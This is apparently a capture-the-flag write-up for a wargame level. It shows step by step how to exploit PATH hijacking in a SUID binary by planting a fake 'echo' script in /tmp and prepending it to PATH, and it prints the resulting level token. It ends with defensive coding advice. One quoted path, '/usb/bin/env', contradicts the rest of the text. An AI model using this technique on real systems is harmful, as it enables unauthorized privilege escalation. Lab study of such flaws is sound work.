# level03

## Goal

Execute arbitrary code with the privileges of the `flag03` user.

## Enumeration

Inspect the binary:

```bash
file level03
ls -l level03
strings level03
```

Output:

```text
-rwsr-sr-x 1 flag03 level03 ...
```

The binary is **SUID**, meaning it executes with the privileges of `flag03`.

Running `strings` reveals:

```text
/usr/bin/env echo Exploit me
```

## Analysis

`system()` is used to execute:

```bash
/usb/bin/env echo Exploit me
```

`env` does not execute `/bin/echo` directly. Instead, it searches for `echo` using the current `PATH` environment variable.

If an attacker controls the beginning of `PATH`, a malicious executable named `echo` will be executed instead of the system one.

This is a classic **PATH hijacking** vulnerability.

## Exploitation

Create a fake `echo` executable:

```bash
cd /tmp

cat > echo << EOF
#!/bin/sh
/bin/getflag
EOF

chmod +x echo
```

Modify the environment:

```bash
export PATH=/tmp:$PATH
```

Run the vulnerable binary:

```bash
~/level03
```

## Validation

Output:

```text
Check flag. Here is your token:
qi0maab88jeaj46qoumi7maus
```

The returned token is the password for `level04`.

## Concept

This level demonstrates a **PATH hijacking** vulnerability.

A privileged program should never execute commands that depend on the user's `PATH`.

Instead of:

```c
system("/usr/bin/env echo Exploit me");
```

it should execute an absolute path:

```c
system("/bin/echo Exploit me");
```

or avoid `system()` entirely by using `execve()` with a controlled environment.

## Resources

Useful commands:

```bash
strings level03
ltrace ./level03
strace ./level03
objdump -d ./level03
```

`ltrace` clearly shows the vulnerable call:

```text
system("/usr/bin/env echo Exploit me")
```

which directly reveals the exploitation path.
